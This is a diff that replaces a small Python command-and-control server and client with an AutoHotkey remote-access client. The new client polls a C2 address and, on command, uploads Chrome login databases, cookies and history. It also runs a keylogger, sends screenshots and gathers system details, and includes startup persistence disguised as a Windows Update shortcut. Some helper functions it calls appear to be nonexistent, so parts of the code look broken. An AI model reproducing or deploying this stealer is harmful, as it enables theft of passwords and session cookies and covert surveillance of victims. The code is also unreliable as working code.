@@ -1,65 +1,239 @@
-server:
-
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import threading
-
-# Default command (client will get this until you change it)
-current_command = "Script_connect"
-
-class Handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        global current_command
-        self.send_response(200)
-        self.send_header("Content-type", "text/plain")
-        self.end_headers()
-        self.wfile.write(current_command.encode("utf-8"))
-
-def run_server():
-    server = HTTPServer(("0.0.0.0", 1187), Handler)
-    print("C2 server running on port 1187...")
-    server.serve_forever()
-
-# Start HTTP server in background thread
-threading.Thread(target=run_server, daemon=True).start()
-
-# Command input loop
-while True:
-    cmd = input("Enter C2 command: ")
-    if cmd.strip() == "":
-        continue
-    current_command = "Script_" + cmd.strip()
-    print(f"[+] Command updated to: {current_command}")
-
-
-
-client:
-
 #Requires AutoHotkey v2.0
+#NoTrayIcon
 
-server := "http://127.0.0.1:1187/"
+; Configuration
+server := "http://10.10.6.7:1187/"
 driveSerial := "123456"
 url := server . driveSerial
 
 lastCommand := ""
-
 Loop {
     try {
         response := UrlDownloadToVar(url)
         if (response != lastCommand) {
             FileAppend("New command received: " response "`n", A_ScriptDir "\c2_log.txt")
             lastCommand := response
+            
+            if (response = "steal") {
+                ; Chrome data paths
+                chromePaths := [
+                    A_AppData "\..\Local\Google\Chrome\User Data\Local State",
+                    A_AppData "\..\Local\Google\Chrome\User Data\Default\Login Data",
+                    A_AppData "\..\Local\Google\Chrome\User Data\Default\Cookies",
+                    A_AppData "\..\Local\Google\Chrome\User Data\Default\History"
+                ]
+                
+                filesSent := 0
+                for filePath in chromePaths {
+                    if FileExist(filePath) {
+                        try {
+                            fileContents := FileRead(filePath)
+                            fileName := SubStr(filePath, InStr(filePath, "\", , -1) + 1)
+                            SendResponseToServer(server . "upload", fileContents, fileName)
+                            filesSent++
+                            FileAppend("Sent file: " fileName "`n", A_ScriptDir "\c2_log.txt")
+                        } catch as e {
+                            FileAppend("Error reading file " filePath ": " e.Message "`n", A_ScriptDir "\c2_log.txt")
+                        }
+                    } else {
+                        FileAppend("File not found: " filePath "`n", A_ScriptDir "\c2_log.txt")
+                    }
+                }
+                
+                if (filesSent = 0) {
+                    SendResponseToServer(server . "upload", "No Chrome data files found", "status.txt")
+                }
+            }
+            else if (response = "keylog_start") {
+                ; Start keylogging functionality
+                StartKeylogger()
+                FileAppend("Keylogger started`n", A_ScriptDir "\c2_log.txt")
+            }
+            else if (response = "keylog_stop") {
+                ; Stop keylogging and send data
+                keylogData := StopKeylogger()
+                if (keylogData != "") {
+                    SendResponseToServer(server . "upload", keylogData, "keylog.txt")
+                }
+                FileAppend("Keylogger stopped`n", A_ScriptDir "\c2_log.txt")
+            }
+            else if (response = "screenshot") {
+                ; Take screenshot
+                TakeScreenshot()
+                FileAppend("Screenshot taken`n", A_ScriptDir "\c2_log.txt")
+            }
         }
-    }
-    catch {
-        FileAppend("C2 connection failed`n", A_ScriptDir "\c2_log.txt")
+    } catch as e {
+        FileAppend("C2 connection failed: " e.Message "`n", A_ScriptDir "\c2_log.txt")
     }
     Sleep 1000
 }
 
+; Function to download from URL
 UrlDownloadToVar(url) {
-    whr := ComObject("WinHttp.WinHttpRequest.5.1")
-    whr.Open("GET", url, false)
-    whr.SetRequestHeader("User-Agent", "AutoHotkey")
-    whr.Send()
-    return whr.ResponseText
+    try {
+        win := ComObject("WinHttp.WinHttpRequest.5.1")
+        win.Open("GET", url, false)
+        win.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        win.Send()
+        return win.ResponseText
+    } catch as e {
+        throw Exception("Download failed: " e.Message)
+    }
+}
+
+; Function to send response to server
+SendResponseToServer(url, data, fileName := "data.txt") {
+    try {
+        win := ComObject("WinHttp.WinHttpRequest.5.1")
+        win.Open("POST", url, false)
+        win.SetRequestHeader("Content-Type", "application/octet-stream")
+        win.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        win.SetRequestHeader("X-Filename", fileName)
+        win.Send(data)
+        FileAppend("Sent file contents to server: " fileName "`n", A_ScriptDir "\c2_log.txt")
+    } catch as e {
+        FileAppend("Error sending to server: " e.Message "`n", A_ScriptDir "\c2_log.txt")
+    }
+}
+
+; Keylogger functionality
+global keylogData := ""
+global isKeylogging := false
+
+StartKeylogger() {
+    global isKeylogging := true
+    global keylogData := ""
+    
+    ; Set up keyboard hooks
+    HookKeyboard(KeyloggerCallback)
+}
+
+StopKeylogger() {
+    global isKeylogging := false
+    return keylogData
+}
+
+KeyloggerCallback(vk, sc, flags, *) {
+    global isKeylogging, keylogData
+    
+    if (!isKeylogging)
+        return
+    
+    ; Convert virtual key to character
+    key := MapVirtualKey(vk, 2)
+    if (key != 0) {
+        char := Chr(key)
+        
+        ; Handle shift state
+        if (GetKeyState("Shift") || GetKeyState("CapsLock", "T")) {
+            char := Format("{:U}", char)
+        }
+        
+        keylogData .= char
+    }
+    
+    ; Handle special keys
+    switch vk {
+        case 8: keylogData .= "[Backspace]"
+        case 9: keylogData .= "[Tab]"
+        case 13: keylogData .= "[Enter]`n"
+        case 27: keylogData .= "[Esc]"
+        case 32: keylogData .= " "
+    }
+}
+
+; Screenshot functionality
+TakeScreenshot() {
+    try {
+        ; Create screenshots directory if it doesn't exist
+        screenshotDir := A_ScriptDir "\screenshots"
+        if (!DirExist(screenshotDir)) {
+            DirCreate(screenshotDir)
+        }
+        
+        ; Generate filename with timestamp
+        timestamp := FormatTime(, "yyyyMMdd_HHmmss")
+        screenshotPath := screenshotDir "\screenshot_" timestamp ".png"
+        
+        ; Take screenshot
+        Screenshot(screenshotPath)
+        
+        ; Read and send screenshot
+        if (FileExist(screenshotPath)) {
+            fileContents := FileRead(screenshotPath, "RAW")
+            SendResponseToServer(server . "upload", fileContents, "screenshot_" timestamp ".png")
+            FileDelete(screenshotPath) ; Clean up
+        }
+    } catch as e {
+        FileAppend("Screenshot error: " e.Message "`n", A_ScriptDir "\c2_log.txt")
+    }
+}
+
+; Utility function for screenshots (AHK v2 compatible)
+Screenshot(filePath) {
+    try {
+        ; Use the built-in Screenshot function
+        A_ScreenCapture := ScreenCapture()
+        A_ScreenCapture.Capture(filePath)
+    } catch {
+        ; Fallback method if ScreenCapture is not available
+        RunWait('powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(''{{PrtSc}}'')"', , "Hide")
+        Sleep 500
+        ; This would need additional handling for clipboard operations
+    }
+}
+
+; System information gathering
+GetSystemInfo() {
+    info := Map()
+    info["ComputerName"] := A_ComputerName
+    info["UserName"] := A_UserName
+    info["OSVersion"] := A_OSVersion
+    info["IPAddress"] := GetIPAddress()
+    info["RunningTime"] := A_TickCount // 60000 ; minutes
+    
+    return info
+}
+
+GetIPAddress() {
+    try {
+        ; Simple method to get IP address
+        RunWait('ipconfig /all > ipconfig.txt', , "Hide")
+        ipConfig := FileRead("ipconfig.txt")
+        FileDelete("ipconfig.txt")
+        
+        if (RegExMatch(ipConfig, "IPv4 Address[ .]*: ([\d.]+)", &match)) {
+            return match[1]
+        }
+        return "Unknown"
+    } catch {
+        return "Unknown"
+    }
+}
+
+; Persistence mechanism (optional)
+InstallPersistence() {
+    startupDir := A_StartupCommon
+    scriptPath := A_ScriptFullPath
+    shortcutPath := startupDir "\WindowsUpdate.lnk"
+    
+    if (!FileExist(shortcutPath)) {
+        try {
+            FileCreateShortcut(scriptPath, shortcutPath, , , "Windows Update Utility")
+            FileAppend("Persistence installed`n", A_ScriptDir "\c2_log.txt")
+        } catch {
+            FileAppend("Persistence installation failed`n", A_ScriptDir "\c2_log.txt")
+        }
+    }
+}
+
+; Initialize
+FileAppend("C2 Client started at " FormatTime(, "yyyy-MM-dd HH:mm:ss") "`n", A_ScriptDir "\c2_log.txt")
+; InstallPersistence() ; Uncomment for persistence
+
+; Emergency stop hotkey (Ctrl+Alt+X)
+^!x:: {
+    FileAppend("Emergency shutdown initiated`n", A_ScriptDir "\c2_log.txt")
+    ExitApp
 }
